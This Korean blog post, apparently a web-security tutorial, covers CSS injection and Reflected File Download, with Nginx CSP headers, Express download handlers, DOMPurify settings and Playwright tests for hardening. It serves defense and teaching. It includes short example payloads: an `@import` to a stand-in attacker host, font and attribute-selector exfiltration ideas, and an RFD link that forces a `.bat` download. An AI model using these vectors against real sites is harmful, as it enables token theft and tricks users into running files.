---
layout: post
title: 웹해킹 - CSS Injection, RFD
date: 2025-10-05 20:25:23 +0900
category: 웹해킹
---
# CSS Injection / RFD(Reflected File Download)

**— 개념 · 위험 벡터 · 안전 재현(차단이 정상) · 코드로 구현하는 방어(콘텐츠 타입 고정·`nosniff`·첨부 강제·CSP·Sanitize)**

> ⚠️ **법·윤리 고지**
> 본 문서는 **자신/조직 소유 자산**에서 **방어·점검**을 목적으로 합니다.
> 공격 기법을 상세 재현하는 대신, “**어디가 위험하고 어떻게 막는지**”와 “막혀야 정상인 안전 재현”에 초점을 둡니다.

---

## 한눈에 보기 (Executive Summary)

- **CSS Injection**
  - **문제**: 사용자 입력이 **`<style>`/`style=`/CSS 값/선택자**에 주입되면,
    `@import`/`url()`/`@font-face` 등 **외부 요청을 트리거**하여 교차 오리진으로 **상태·토큰·DOM 조각** 추정/유출 시도가 가능.
  - **방어 핵심**:
    1) **콘텐츠 타입 고정**(`text/css`/`text/html`/`text/plain`) + **`X-Content-Type-Options: nosniff`**
    2) **CSP**: `style-src`/`font-src`/`img-src`/`connect-src` **화이트리스트**
    3) **Sanitize/Whitelist**: `style` 속성/임의 CSS 금지, 값·단위 **화이트리스트**, `CSS.escape`/`setProperty` 사용
    4) **서드파티 CSS 최소화** + **서브리소스 무결성(SRI)**
    5) **교차 오리진 포함 자체 차단**: `Cross-Origin-Resource-Policy`(CORP)

- **RFD (Reflected File Download)**
  - **문제**: 서버가 **사용자 입력을 반사**한 응답을 **다운로드**로 유도할 때,
    브라우저/OS가 **파일명·내용을 실행 가능한 확장자(.bat, .cmd, .ps1, .html 등)**로 인식하면 **사회공학 + 실행 위험**.
  - **방어 핵심**:
    1) **항상 `Content-Disposition: attachment`** + **안전한 파일명 강제**(화이트리스트 확장자)
    2) **`Content-Type` 정확히 설정** + **`X-Content-Type-Options: nosniff`**
    3) **응답 본문 앞부분(“시그니처”)을 임의 입력으로 시작하지 않기**(고정 prefix/UTF-8 BOM 등)
    4) **다운로드 전 별도 확인(2차 사용자 제스처)**, 로깅/레이트 제한
    5) **반사형 다운로드 엔드포인트 제거/축소** (가능하면 **서명된 URL**로만 전달)

---

# CSS Injection — 원리와 벡터

### 어디서 새나가나?

- **HTML 인라인 스타일**: `<div style="color:${user}">`
- **스타일 태그/템플릿**: `<style>.card{background:${userColor}}</style>`
- **CSS-in-JS 문자열 결합**: `` css`width:${user}px` ``
- **선택자/속성명에 사용자 입력 사용**: `document.querySelector("#" + userId)`
- **서드파티 위젯/리치 텍스트**가 **`style`/`<style>` 허용**

### 정보 추정/유출 메커니즘(개념)

- `@import url(https://attacker.tld/a);`, `background-image: url(https://…/?signal=1)`
- `@font-face` + `unicode-range`로 **특정 문자의 존재/길이** 추정
- 속성 선택자(ex. `[value^="A"]`) + **패턴 매칭**으로 값에 따라 **다른 외부 요청** 트리거
- `:visited` 기반 누출은 최신 브라우저에서 **엄격 제한**되나, **다른 신호(타이밍/요청)**로 우회 시도 가능

> 실무 방점: **외부 도메인으로 나가는 요청 자체를 막거나 통제**하고, **임의 CSS 주입을 봉쇄**하세요.

---

# CSS Injection — “안전 재현(스테이징)” 시나리오

> 목표: 보안 설정이 **제대로 막고 있는지** 확인(차단/무력화가 **정상**)

1) **인라인 스타일 주입 차단 확인**
   - 사용자 입력에 `color: url(https://not-allowed.tld/x)` 같은 값 삽입 시도 →
     **Sanitize**로 제거되거나, **CSP `style-src`**/`img-src`로 **요청이 차단**되어야 함.

2) **외부 폰트/이미지 요청 차단 확인**
   - `<style>@font-face{src:url(https://not-allowed.tld/font.woff2)}</style>` →
     **`font-src`** 위반으로 로드 실패해야 정상.

3) **선택자 인젝션 방지 확인**
   - `querySelector("#" + userId)`에 `userId="x[attr^=y]"` 시도 →
     **`CSS.escape`**/화이트리스트로 **선택자 무력화**되어야 정상.

---

# CSS Injection — 방어 레시피 (애플리케이션)

## CSP로 외부 요청 통제

```nginx
# Nginx 예: 최소 권한 원칙

add_header Content-Security-Policy "
  default-src 'self';
  style-src   'self' 'nonce-__RUNTIME_NONCE__';  # 인라인은 nonce로만
  font-src    'self';                            # 외부 폰트 차단
  img-src     'self' data:;                      # data:만 허용할지 검토
  connect-src 'self';
  frame-ancestors 'self';
" always;
add_header X-Content-Type-Options "nosniff" always;      # CSS/JS 스니핑 금지
add_header Cross-Origin-Resource-Policy "same-origin" always;  # CORP
```

> **포인트**
> - 인라인 스타일이 꼭 필요하면 **`nonce`**를 사용하고, 문자열 결합 대신 **서버가 난수 nonce를 부여**.
> - 외부 도메인 요청이 꼭 필요하면 **정확한 도메인만** 화이트리스트.

## DOM 조작 시 안전 API 사용

```ts
// ❌ 나쁜 예: 문자열 결합
el.setAttribute("style", `width:${user}px; background:url(${avatar})`);

// ✅ 좋은 예: 값 화이트리스트 + 안전 API
function setWidthPx(el: HTMLElement, n: unknown) {
  const v = Number(n);
  if (!Number.isFinite(v) || v < 0 || v > 1000) return;
  el.style.setProperty("width", `${Math.floor(v)}px`);
}
// 선택자 조립 시
const safeId = CSS.escape(String(userId));
document.querySelector(`#user-${safeId}`);
```

## 리치 텍스트/템플릿 Sanitize

- **원칙**: 사용자 HTML에서 **`<style>` 태그, `style` 속성, `@import`/`url()`**을 **금지**.
```js
// DOMPurify 예
const clean = DOMPurify.sanitize(userHtml, {
  FORBID_TAGS: ['style'],
  FORBID_ATTR: ['style'],
  ALLOW_UNKNOWN_PROTOCOLS: false
});
container.innerHTML = clean;
```

## 서버에서 MIME 고정 + `nosniff`

```js
// Node/Express — 정적·동적 응답
app.get("/assets/app.css", (req,res)=>{
  res.set("Content-Type","text/css; charset=utf-8");
  res.set("X-Content-Type-Options","nosniff");
  res.send(cssBundle);
});

// 스타일이 아닌 페이지에 CSS로 취급될 여지 제거
app.get("/echo", (req,res)=>{
  res.set("Content-Type","text/plain; charset=utf-8");
  res.set("X-Content-Type-Options","nosniff");
  // 앞부분에 고정 prefix로 “파일 시그니처” 통일 (RFD에도 도움)
  res.send("### Echo Output ###\n" + sanitize(req.query.q));
});
```

## 서드파티 CSS/SaaS 위젯

- **SRI**(Subresource Integrity) + **버전 고정**
- 필요한 최소 스코프만(섀도우 DOM/iframe 샌드박스 활용 고려)

---

# — 원리와 위험

### 무엇이 문제인가

- URL 파라미터를 **파일명/내용**에 반사해서 브라우저에게 **다운로드** 시키는 엔드포인트가 있을 때,
  공격자는 **신뢰 도메인** 링크로 **실행형 확장자**(예: `.bat`, `.cmd`, `.ps1`, `.reg`, `.html`, `.hta`) **파일을 저장하게 유도**.
- 일부 브라우저/OS 조합에서 파일 **내용의 선두 바이트**나 **확장자**를 근거로 **실행/경고 완화**가 발생할 수 있음.

### 위험 시나리오(개념)

```
https://trusted.example.com/download?fn=invoice.bat&body=@echo off
```
- 서버가 `Content-Disposition: inline; filename=invoice.bat` 또는 헤더 누락으로
  브라우저가 **파일을 실행 확장자**로 **저장/열기** 제안 → 사회공학과 결합.

---

# RFD — “안전 재현(스테이징)” 시나리오

1) **실행 확장자 강제 실패**
   - `?fn=evil.bat` 요청 → 서버가 **`attachment`+화이트리스트 확장자**로 **`.txt`로 강제**되어야 정상.
2) **MIME 스니핑 차단**
   - `Content-Type: text/plain` + `nosniff` 설정 시, 브라우저가 **HTML/JS로 렌더**하지 않아야 정상.
3) **본문 선두 사용자 입력 금지**
   - 응답이 **고정 prefix**로 시작해, 임의 입력으로 **파일 매직**을 만들 수 없어야 정상.

---

# RFD — 방어 레시피 (애플리케이션·프록시)

## 안전한 다운로드 엔드포인트

```ts
// Node/Express
const SAFE_EXT = new Set([".txt",".csv",".json",".pdf",".zip"]); // 필요 최소
function safeFilename(name: string) {
  const base = name.replace(/[^\w.\-]/g, "_").toLowerCase();
  const ext = (base.match(/\.[^.]+$/)?.[0] ?? ".txt");
  return SAFE_EXT.has(ext) ? base : base + ".txt";
}

app.get("/download", (req,res)=>{
  const fn = safeFilename(String(req.query.fn || "download.txt"));
  const body = String(req.query.body || "");
  res.set({
    "Content-Type": "application/octet-stream", // 또는 유형별로 정확히
    "X-Content-Type-Options": "nosniff",
    "Content-Disposition": `attachment; filename="${fn}"; filename*=UTF-8''${encodeURIComponent(fn)}`
  });
  // 고정 prefix(서명/헤더) → 파일 매직 위조 방지
  res.write("### Exported from Example ###\n");
  res.end(body);
});
```

## Nginx 레벨에서 강제

```nginx
# 다운로드 경로는 항상 첨부

location /download/ {
  add_header X-Content-Type-Options "nosniff" always;
  add_header Content-Disposition "attachment" always;
  types { }       # 사용자 확장자에 의존하지 않음
  default_type application/octet-stream;
  try_files $uri =404;
}
```

## 업로드/서빙 파이프라인

- **서버 측 MIME 스니핑(매직넘버)** → 실제 유형과 확장자 불일치 시 **거부/정규화**
- **서명 URL**(S3/GCS)로 **직접 다운로드** 유도, 앱 서버의 **반사형 다운로드 엔드포인트 제거**
- **서빙 도메인 분리**(예: `dl.example`), `Content-Disposition: attachment` 기본값

---

# 종합 하드닝 — 헤더/정책 세트

```nginx
# 공통 보안 헤더

add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "
  default-src 'self';
  style-src   'self' 'nonce-__NONCE__';
  font-src    'self';
  img-src     'self' data:;
  connect-src 'self';
  frame-ancestors 'self';
" always;

# 민감 리소스: 교차 포함 자체 차단

add_header Cross-Origin-Resource-Policy "same-origin" always;
```

---

# 개발·리뷰 체크 포인트

- **템플릿**:
  - 절대 **사용자 입력을 `<style>`/`style=`/CSS 값/선택자**에 그대로 삽입하지 말 것.
  - 필요 시 **값 화이트리스트**(숫자·단위 제한) + **`CSS.escape`** + **`element.style.setProperty`**로만.

- **프론트 코드**:
  - 외부 CSS/폰트 로딩은 **정확한 도메인만**. SRI + 버전 고정.
  - CSS-in-JS 라이브러리 설정에 **“동적 값 필터/escape”** 옵션 있는지 확인.

- **백엔드**:
  - **응답 유형 고정**: `text/html`, `text/css`, `text/plain`, `application/json` 등 **정확히**.
  - **모든 응답에 `X-Content-Type-Options: nosniff`** (정적/동적/다운로드).
  - 다운로드는 **무조건 `attachment`** + **파일명 화이트리스트**.

- **인프라**:
  - CDN/엣지에서도 **헤더 보존/주입 정책** 일관화(`nosniff`/CSP/CORP).
  - 로거/알림: 외부 도메인으로 향하는 **예상치 못한 폰트/이미지** 요청 탐지.

---

# 로깅·모니터링 & 테스트

## 탐지 아이디어

- **의심 CSS 로드**: `@import`/외부 `font-src`/특이 도메인 `img-src` 발생 시 경보
- **다운로드 엔드포인트 남용**: 비정상 확장자 시도, 파일명 길이/문자 허용 초과

## 자동 테스트 (Playwright 예)

```ts
test("외부 폰트/이미지 차단(CSP)", async ({ page }) => {
  const reqs: string[] = [];
  page.on("request", r => { if (/not-allowed\.tld/.test(r.url())) reqs.push(r.url()); });

  await page.setContent(`<style>@font-face{src:url(https://not-allowed.tld/a.woff2)}</style>`);
  await page.waitForTimeout(300);
  expect(reqs.length).toBe(0); // CSP로 차단되어야 정상
});

test("다운로드는 attachment + 안전한 확장자", async ({ page }) => {
  const [d] = await Promise.all([
    page.waitForEvent("download"),
    page.goto("https://staging.example.com/download?fn=evil.bat&body=echo")
  ]);
  const suggested = d.suggestedFilename();
  expect(suggested.endsWith(".txt") || suggested.endsWith(".csv")).toBeTruthy();
});
```

---

# 안티패턴(피해야 할 것)

- 사용자 입력을 **그대로** `style=`/`<style>`/CSS 값/선택자에 삽입
- **외부 CSS/폰트** 와일드카드 허용(`*`)
- **`Content-Type` 누락/부정확** + **`nosniff` 미설정**
- 다운로드 응답에서 **`inline`/`filename`**을 **사용자 입력 그대로 반영**
- 반사형 엔드포인트(`/download?body=...`)에서 **본문 시작을 사용자 입력으로 시작**

---

# 체크리스트 (현장용)

- [ ] 모든 응답에 **`X-Content-Type-Options: nosniff`**
- [ ] 정적/동적 **`Content-Type` 정확히 설정**
- [ ] **CSP**: `style-src`에 `'self' 'nonce-…'`, `font-src/img-src/connect-src`는 **정확 화이트리스트**
- [ ] 사용자 HTML **Sanitize**(`style`/`<style>`/`@import`/`url()` 금지)
- [ ] DOM 조작은 **화이트리스트 + `CSS.escape` + `setProperty`**
- [ ] 다운로드는 **항상 `attachment`** + **파일명/확장자 화이트리스트** + **본문 고정 prefix**
- [ ] 업로드/서빙 파이프라인 **MIME 검사**(매직 넘버)
- [ ] 외부 CSS/폰트 **SRI + 버전 고정**
- [ ] 로깅: 외부 폰트/이미지 로드, 다운로드 확장자 변조 시도
- [ ] E2E: **외부 요청 차단**/다운로드 **첨부 강제** 테스트 포함

---

## 맺음말

**CSS Injection**은 “CSS가 코드가 아니다”라는 방심을 파고듭니다.
**RFD**는 “다운로드는 안전하다”는 착각을 노립니다.
**콘텐츠 타입 고정 + `nosniff` + CSP + Sanitize + 첨부 강제**라는 표준 조합이면
두 취약점 계열을 **구조적으로** 상당 부분 차단할 수 있습니다.
